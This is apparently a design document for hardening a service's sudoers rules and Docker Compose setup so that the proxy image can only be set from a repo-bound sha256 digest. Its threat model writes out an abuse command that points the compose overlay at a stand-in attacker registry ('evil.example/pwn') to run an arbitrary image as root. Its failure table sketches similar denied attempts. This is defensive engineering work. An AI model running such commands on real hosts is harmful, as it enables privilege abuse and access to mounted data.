# D1.6c — Pin Value Binding at the sudo boundary (P1.4)

**Status:** DESIGN ONLY. No code, no PR. This document is the implementation
contract for the follow-up PR that closes the P1.4 residual tracked in
`D1.6c-upgrade-apply-plan.md` §13.2. It supersedes the two candidate sketches in
that section by committing to **Option A (repo-bound digest pull + fixed local
tag)**.

**Scope guardrails (carried from the approval):** docs only here; the
implementation PR must touch **only** the apply / image-rollback image-selection
mechanism. Out of scope: release catalog, GUI, CP, data-rollback logic, the
`CULVERT_BACKUP_PASSPHRASE` env_keep, and any broad refactor.

> ## The invariant this plan establishes
> **The image the proxy runs is selected at the sudo boundary, not by a
> caller-supplied environment variable.** After this change, `docker compose up`
> resolves a *fixed local tag* (`culvert/proxy:pinned`) that has **no env
> interpolation**, and that tag can only ever be set from a
> `{proxy_repo}@sha256:<64hex>` reference whose **repo is a sudoers-rendered
> literal**. `CULVERT_PROXY_IMAGE` ceases to exist as an image-selection
> mechanism. This is the acceptance test for the whole plan.

---

## 1. Threat model

### 1.1 Current residual

The apply / rollback image step injects the target image through the
`CULVERT_PROXY_IMAGE` overlay, which `docker compose` resolves from:

```yaml
# docker-compose.yml — proxy AND the same-image cli service
image: ${CULVERT_PROXY_IMAGE:-ghcr.io/kidcarmi/culvert:latest}
```

For this to survive `sudo`'s `env_reset` under `privilege_mode=sudoers`, the
install ships a **command-scoped** preservation (#380):

```
Cmnd_Alias CULVERT_MAINT_PROXY_IMAGE_CMNDS = \
    /usr/bin/docker compose -f {compose_path} pull proxy, \
    /usr/bin/docker compose -f {compose_path} up -d
Defaults!CULVERT_MAINT_PROXY_IMAGE_CMNDS env_keep += "CULVERT_PROXY_IMAGE"
```

`pull proxy` and `up -d` *legitimately consume* the variable, so the env_keep
cannot be removed without breaking apply. The agent's `image_allowlist` /
`ValidateImageRef` checks live **in-process**, before the runner builds argv —
they are not enforced at the privilege boundary.

**Residual:** a principal who can invoke `sudo` as `culvert-maint` can run, by
hand:

```sh
CULVERT_PROXY_IMAGE=evil.example/pwn@sha256:<any> \
  sudo -n /usr/bin/docker compose -f <compose_path> up -d
```

`sudo` matches the NOPASSWD `up -d` entry, `env_keep` preserves the variable,
compose recreates `proxy` (and the `cli` service) on **an arbitrary image**, as a
root-managed container with `proxy-data:/data` (and, for `cli`, `/backup`)
mounted. The in-process allowlist is bypassed entirely.

### 1.2 Attacker capabilities (assumed)

- **In scope:** an attacker who has compromised the `culvert-maint` service
  account (RCE in the agent, or a foothold as that uid) and can therefore invoke
  any command the sudoers allowlist permits, with an environment of their
  choosing. This is the exact principal #380 hardened against and the one this
  plan must contain.
- **Out of scope (already-lost game):** root on the host, the ability to edit
  `/etc/sudoers.d/culvert-maint` (mode 0440 root:root), edit the root-owned
  compose file, or control the Docker daemon socket directly. If any of these
  hold, no agent-level control is meaningful.

### 1.3 Security objective

Reduce what a compromised `culvert-maint` principal can run as the
root-managed proxy from **"any image from any registry"** to **"only a
`sha256` digest of the single configured `{proxy_repo}`."**

- This eliminates the real threat: running attacker-built code as root with
  `/data` + `/backup` mounts.
- The remaining residual — selecting *which* digest of the *legitimate* repo
  (e.g. a downgrade to a known-vulnerable prior build) — is accepted as far
  smaller, is independently gated by `image_allowlist` on the API path
  (defense-in-depth, retained), and requires the digest to actually exist in the
  registry / local cache. Eliminating it entirely would require sudo to
  cross-reference per-op intent, which it cannot; that is out of "smallest safe."

## 2. Recommended architecture

The image source of truth flips from *"an env var compose resolves"* to *"a
fixed local tag whose only writer is a repo-bound, digest-pattern-matched sudo
command."*

### 2.1 Repo-bound digest pull

The image-bearing step is **raw `docker` (not `docker compose`)**, split into two
commands, each pattern-matched in sudoers with the repo as a **rendered
literal** and the digest as 64 enumerated hex classes:

```
docker pull {proxy_repo}@sha256:<64hex>
docker tag  {proxy_repo}@sha256:<64hex> culvert/proxy:pinned
```

`{proxy_repo}` is rendered at install time from config (the same render
mechanism as `{compose_path}`), so the sudoers line is a closed literal — there
is **no wildcard for the repo**. The only free bytes are the 64 hex of the
digest. The retag **destination is the fixed literal `culvert/proxy:pinned`**.

### 2.2 Fixed local pinned tag

`culvert/proxy:pinned` is a **local-only** tag:

- It has no registry host component, and is never pushed. It exists only as a
  local alias created by `docker tag` above (or seeded at install — §8).
- Because it is a bare `name:tag` with no env interpolation, nothing a caller
  supplies can change what `compose up` resolves it to. The *only* way to move
  the tag is the repo-bound `docker tag` command.

### 2.3 Compose image changes

`proxy` and `cli` both change from:

```yaml
image: ${CULVERT_PROXY_IMAGE:-ghcr.io/kidcarmi/culvert:latest}
```

to:

```yaml
image: culvert/proxy:pinned
```

Both services share the tag exactly as they share the override today, so the
backup/restore `cli` stays in lockstep with the running daemon. The
`${CULVERT_PROXY_IMAGE:-…}` interpolation is removed everywhere it appears.

### 2.4 Verification model (unchanged, and why the retag is transparent)

The apply/rollback `verify` step re-captures the **running container's**
`RepoDigests` (via `CaptureRunningProxyImage` → `docker image inspect`) and
asserts they include the pinned digest. This is unaffected by the retag:
`RepoDigests` are populated from the **registry pull metadata**, not from local
tags, so an image pulled as `{proxy_repo}@sha256:D` still reports
`{proxy_repo}@sha256:D` in `RepoDigests` after it has been retagged to
`culvert/proxy:pinned`. Therefore:

- A stale or foreign `culvert/proxy:pinned` tag **cannot** satisfy `verify` —
  the check is against the immutable registry digest of what is actually
  running, not against the tag.
- Pre-existing limitation, NOT a regression: an image with **no** `RepoDigests`
  (e.g. an air-gapped `docker load` with no registry reference) fails `verify`
  today on the compose-pull path too; this plan does not change that.

## 3. Apply flow (`POST /v1/upgrades/apply`)

Only the `pull` and `restart` stages change. `capture_before`, `resolve_target`,
`pre_backup`, `health_gate`, `verify`, the inline-rollback recovery stages, and
`report` are **unchanged**.

| Stage | Before | After |
|---|---|---|
| `resolve_target` | tag→digest or verbatim digest → `acc.pinnedRef` = `repo@sha256:…` | **unchanged**; additionally the repo of `acc.pinnedRef` MUST equal `{proxy_repo}` (see §3.1) |
| `pull` | `ComposePull(pinnedRef)` (compose pull proxy + `CULVERT_PROXY_IMAGE` overlay) | `ComposePullDigest(pinnedRef)` **then** `ComposeTagPinned(pinnedRef)` |
| `restart` | `ComposeUpWithImage(pinnedRef)` (compose up + overlay) | `ComposeUp()` (no overlay) |

`already_current` short-circuiting (`skipIfCurrent`) is preserved verbatim:
when the running digest already matches the target, `pull`, `restart`,
`health_gate`, and `verify` each no-op exactly as today.

### 3.1 Repo-consistency gate (new, fail-closed)

`acc.pinnedRef`'s repository portion MUST equal the configured `{proxy_repo}`.
This is enforced in the runner (`ComposePullDigest` / `ComposeTagPinned` reject a
ref whose repo ≠ `proxy_repo`) and mirrors the sudoers literal. If an operator's
`image_allowlist` is broader than `{proxy_repo}` and `resolve_target` produces a
foreign-repo pin, the op fails `command_error` at `pull` rather than running an
off-repo image. **Config invariant (documented for the operator):**
`image_allowlist` and `proxy_repo` must describe the same repository; install
validation (§8) surfaces a mismatch.

## 4. Manual image rollback flow (`POST /v1/rollbacks`, `mode=image`)

No handler-logic change. The request already requires a strict
`repo@sha256:<64hex>` (`rollbackDigestRefRE`) and passes `image_allowlist`. The
target flows into the **shared** `imageRollbackStages` core, whose two
image-bearing stages are edited once (§5) and thereby cover this path:

- `rollback_pull`: `ComposePullDigest(target)` + `ComposeTagPinned(target)`.
- `rollback_restart`: `ComposeUp()`.
- `rollback_health`, `rollback_verify`: unchanged.

The same §3.1 repo-consistency gate applies (the rollback target repo must equal
`{proxy_repo}`).

---

## 5. Inline auto-rollback flow

Inline auto-rollback (#375) reuses `imageRollbackStages` from
`rollback_stages.go` verbatim, decorated with skip/promote wrappers. Because the
**core builder is shared**, the §4 edit to `rollback_pull` / `rollback_restart`
**is** the inline-rollback edit — there is exactly one place to change, and the
anti-drift guarantee (manual ≡ inline) is preserved by construction. The inline
target (`priorRef`, a captured `RepoDigest`) is already a
`{proxy_repo}@sha256:…` reference, so it satisfies the pull validator and the
sudoers pattern.

No change to: which failures trigger rollback (`upgradeFailedPostRestart`),
`rollback_on_failure` opt-out semantics, `failure_reason` promotion, or the
`upgrades.apply:rollback` audit sub-action.

## 6. Sudoers changes

`packaging/sudoers/culvert-maint`. A new `{proxy_repo}` placeholder is rendered
by `install.sh` alongside `{compose_path}`.

### 6.1 Removed entries

```
# DELETE — proxy-image env preservation (no longer any env to preserve):
Cmnd_Alias CULVERT_MAINT_PROXY_IMAGE_CMNDS = \
    /usr/bin/docker compose -f {compose_path} pull proxy, \
    /usr/bin/docker compose -f {compose_path} up -d
Defaults!CULVERT_MAINT_PROXY_IMAGE_CMNDS env_keep += "CULVERT_PROXY_IMAGE"

# DELETE — compose-level proxy pull (replaced by raw repo-bound pull+tag):
culvert-maint ALL=(root) NOPASSWD: /usr/bin/docker compose -f {compose_path} pull proxy
```

`CULVERT_MAINT_PASSPHRASE_CMNDS` and its `env_keep` (backup/restore) are
**untouched** — out of scope.

### 6.2 New entries

```
# ─── image pull + retag (upgrade apply / rollback image step, repo-bound) ───
# The repo is a RENDERED LITERAL ({proxy_repo}); the digest is 64 enumerated
# [0-9a-f] classes (NO trailing wildcard — sudo's `*` matches whitespace and
# would admit extra argv). The retag DESTINATION is the fixed literal
# culvert/proxy:pinned. Together these bind the proxy image to
# "{proxy_repo} @ some sha256 digest" at the privilege boundary.
culvert-maint ALL=(root) NOPASSWD: /usr/bin/docker pull {proxy_repo}@sha256:[0-9a-f][0-9a-f]…(×64)
culvert-maint ALL=(root) NOPASSWD: /usr/bin/docker tag {proxy_repo}@sha256:[0-9a-f][0-9a-f]…(×64) culvert/proxy:pinned
```

> Implementation note: the `[0-9a-f]` class is repeated **exactly 64 times** in
> each line, identical to the precedent set by `containerInspectSudoersLines()`
> for container-id lengths. The runner template's `SudoersLines` must generate
> the same 64-class string so the static parity test matches byte-for-byte.

### 6.3 Retained entry (now env-free)

```
culvert-maint ALL=(root) NOPASSWD: /usr/bin/docker compose -f {compose_path} up -d
```

`up -d` stays, but with the proxy-image `env_keep` gone it can no longer be
influenced by a caller env var. It is now **safely shared** by apply restart,
rollback restart, and restore's `up` — all three bring up `culvert/proxy:pinned`
deterministically.

### 6.4 Command constraints / repo binding (summary)

- **No wildcard for the repo.** `{proxy_repo}` is a literal rendered from config;
  changing the repo (e.g. air-gap local registry, repo migration) requires
  re-running `install.sh` (re-render + `visudo -c`), the same operational
  contract as `{compose_path}` today.
- **Digest is exactly 64 hex**, enumerated, no trailing `*`.
- **Retag destination is fixed** (`culvert/proxy:pinned`); a compromised
  principal cannot retag a pulled image to any other tag via this entry.
- `docker pull` / `docker tag` are **global docker reads/writes of the local
  image store** — they cannot recreate or restart the stack; only the unchanged
  `up -d` does, and it now takes no image input.

## 7. Runner / template changes

`internal/runner/`. Four-step contract (template + method + sudoers + parity
test) applies to each new template.

### 7.1 Added

- **`TemplateImagePullDigest`** (`image.pull.digest`): `BaseArgv =
  ["docker","pull"]`; one positional `<ref>`. `SudoersLines` =
  `/usr/bin/docker pull {proxy_repo}@sha256:` + 64×`[0-9a-f]`. `StateChanging:
  true` (mutates the local image store).
- **`TemplateImageTagPinned`** (`image.tag.pinned`): `BaseArgv =
  ["docker","tag"]`; positional `<ref>` then the fixed literal
  `culvert/proxy:pinned`. `SudoersLines` = the pull pattern with the trailing
  ` culvert/proxy:pinned`. `StateChanging: true`.
- **`ComposePullDigest(ctx, ref)`** and **`ComposeTagPinned(ctx, ref)`** runner
  methods. Both call a new **`validatePinnedDigestRef(ref, r.proxyRepo)`** that
  enforces `^<proxyRepo-literal>@sha256:[0-9a-f]{64}$` (repo bound + exact
  digest), then build argv and `runWithEnv(ctx, argv, nil)` — **no overlay**.
- **`proxyRepo` field on `Runner`** + **`ProxyRepo` on `Options`** (and a
  `proxy_repo` config key, default `ghcr.io/kidcarmi/culvert`, surfaced to the
  template registry for `SudoersLines` rendering and to the validator). The
  pinned-tag literal `culvert/proxy:pinned` is a runner constant
  (`pinnedProxyTag`).

### 7.2 Removed

- `TemplateComposePull` (`compose.pull`, `docker compose … pull proxy`) and
  `ComposePull`.
- `ComposeUpWithImage` (callers switch to the existing env-free `ComposeUp`).
- `EnvCulvertProxyImage` const, the `{EnvCulvertProxyImage: ref}` overlay
  construction, and the `EnvOverlayOnly` registration of that name in `main.go`.
  (Leaving the name in `EnvAllow`/`EnvOverlayOnly` would be dead surface; remove
  it so the negative test in §10 can assert total absence.)

### 7.3 Unchanged

`ComposeUp`, `CaptureRunningProxyImage`, `ComposeManifestInspect`,
`ComposeImageInspect`, `ComposeContainerInspect`, and the verify logic.

## 8. Migration strategy

The hard part: `culvert/proxy:pinned` must exist **before** any `compose up`
resolves it, or the stack fails with "no such image" (a bare `name:tag` with no
local image makes compose attempt `docker.io/culvert/proxy:pinned`, which does
not exist).

### 8.1 Fresh install

`install.sh` gains a **seed step**, ordered:

1. Read `proxy_repo` (+ the desired bootstrap reference — default
   `{proxy_repo}:latest`, or a configured digest) from config.
2. Render `{proxy_repo}` (and `{compose_path}`) into the sudoers template;
   `visudo -c`; install 0440 root:root (existing flow).
3. **Seed:** `docker pull {bootstrap_ref}` → `docker tag {bootstrap_ref}
   culvert/proxy:pinned`.
4. Install the compose file already carrying `image: culvert/proxy:pinned`.
5. First `up -d` resolves the seeded local tag.

`install.sh` validates that `proxy_repo` is consistent with `image_allowlist`
(both describe the same repo) and **refuses to complete** on mismatch (mirrors
the existing leftover-placeholder refusal).

### 8.2 Existing install (the order-sensitive path)

For a host already running with `${CULVERT_PROXY_IMAGE:-…}`:

1. **Seed from the currently-running image first** (do NOT touch compose yet):
   capture the running proxy digest (`CaptureRunningProxyImage` /
   `docker inspect`) → `docker tag <running repo@sha256> culvert/proxy:pinned`.
   This guarantees the pinned tag points at exactly what is live right now.
2. Re-render + install the new sudoers (adds pull/tag, removes `pull proxy`
   line + the proxy-image `env_keep`).
3. Swap the compose `image:` for `proxy` and `cli` to `culvert/proxy:pinned`.
4. Remove `CULVERT_PROXY_IMAGE` from any operator unit drop-in / shell.
5. A no-op `up -d` (or a deferred one) now uses the seeded pinned tag; the stack
   is unchanged because the tag points at the already-running digest.

### 8.3 Upgrade ordering (the rule)

**Seed → sudoers → compose-swap → drop env.** The only ordering that never
exposes a window where `compose up` would resolve a missing `culvert/proxy:pinned`
or a still-interpolated `${CULVERT_PROXY_IMAGE}`. `install.sh` performs these
steps atomically per host and aborts (leaving the prior state) if any step fails.

### 8.4 Failure prevention

- **Pre-swap guard:** `install.sh` refuses to write the new compose `image:`
  unless `docker image inspect culvert/proxy:pinned` succeeds (seed verified).
- **visudo gate:** unchanged — the rendered sudoers must pass `visudo -c` before
  it is moved into `/etc`, and the install rolls back on failure.
- **Idempotent seed:** re-running the seed retags to the same digest; safe to
  repeat.
- **No partial env removal:** the `env_keep` line is removed in the **same**
  sudoers install that adds pull/tag, so there is never a state where apply
  needs the var but it has been stripped.

## 9. Failure modes

| # | Condition | Behavior |
|---|---|---|
| F1 | `docker pull` fails (network/auth/absent digest) | op fails `command_error` at `pull`; nothing retagged; `culvert/proxy:pinned` still points at the prior image; running stack untouched; inline rollback (if enabled) can still fire against the intact prior tag. |
| F2 | `docker tag` fails (rare; e.g. disk) | op fails `command_error`; `up -d` not reached; running stack untouched. |
| F3 | pull OK, tag OK, `up -d` fails | `up` is INDETERMINATE → marked post-restart; `verify` (re-captures running RepoDigests) fails to find the pinned digest → inline rollback fires (re-pull+tag+up the prior digest). Safe. |
| F4 | pull OK, **tag fails silently to update** (tag still points old) | `up -d` is a no-op on the old image → `verify` running digest ≠ pinned → fail → inline rollback. The authoritative running-digest check, not the tag, governs. |
| F5 | Agent crash **between tag and up** | pinned tag now points new, stack still old. No auto-correction, but `status` shows the true (old) running digest, and a re-run apply is idempotent (`already_current` keys off the running digest, not the tag). Documented operator note. |
| F6 | `acc.pinnedRef` repo ≠ `{proxy_repo}` (allowlist/repo drift) | `ComposePullDigest` validation rejects → op fails `command_error` before any sudo; no off-repo image runs (§3.1). |
| F7 | Direct-sudo abuse attempt: `docker pull evil/x@sha256:…` | sudo **denies** — `evil/x` ≠ the rendered `{proxy_repo}` literal. The bypass is closed for foreign repos. |
| F8 | Direct-sudo abuse attempt: `docker tag <legit digest> someother:tag` | sudo **denies** — destination ≠ `culvert/proxy:pinned`. The pinned tag cannot be pointed elsewhere, nor any other tag created via this entry. |
| F9 | Direct-sudo `CULVERT_PROXY_IMAGE=evil … up -d` (the old residual) | **no effect** — compose no longer interpolates the var; `up` resolves the fixed local tag. Residual closed. |
| F10 | Air-gapped image with empty `RepoDigests` | `verify` fails (pre-existing behavior of the digest check, unchanged by this plan; noted, not introduced). |

## 11. Rollback compatibility analysis

| Property | Before | After | Verdict |
|---|---|---|---|
| Manual rollback target shape | strict `repo@sha256:<64hex>` | same | ✅ unchanged |
| Inline rollback target shape | captured `RepoDigest` (`repo@sha256`) | same | ✅ unchanged |
| Shared core (manual ≡ inline) | one `imageRollbackStages` builder | one builder, two edited stages | ✅ anti-drift preserved |
| Image-bearing op | `ComposePull` + `ComposeUpWithImage` (overlay) | `ComposePullDigest` + `ComposeTagPinned` + `ComposeUp` | ✅ behavior-equivalent: same digest pinned, recreated, health-gated, verified |
| Verify semantics | running RepoDigest ⊇ target digest | same | ✅ unchanged; retag is transparent (§2.4) |
| Repo binding | in-process `image_allowlist` only | in-process **+ sudo boundary literal** | ✅ strictly stronger |
| Failure recovery | inline rollback on post-restart failure | same triggers, same flow | ✅ unchanged |

A rollback target whose repo equals `{proxy_repo}` (the normal case) behaves
identically. A rollback target with a *foreign* repo — which `image_allowlist`
could previously have admitted — is now rejected at `pull` (F6); this is a
deliberate tightening, not a regression, and matches the apply path's §3.1 gate.

**Emergency-recovery note:** because the agent API contract (`mode=image` with a
`repo@sha256` body) is unchanged, an operator can still drive an emergency
rollback to any prior `{proxy_repo}` digest through the normal endpoint. The raw
direct-sudo escape hatch (`CULVERT_PROXY_IMAGE=… up -d`) is intentionally gone;
recovery flows through the agent or, at the host-root level (out of the
threat-model scope), a manual `docker tag … culvert/proxy:pinned` + `up -d`.
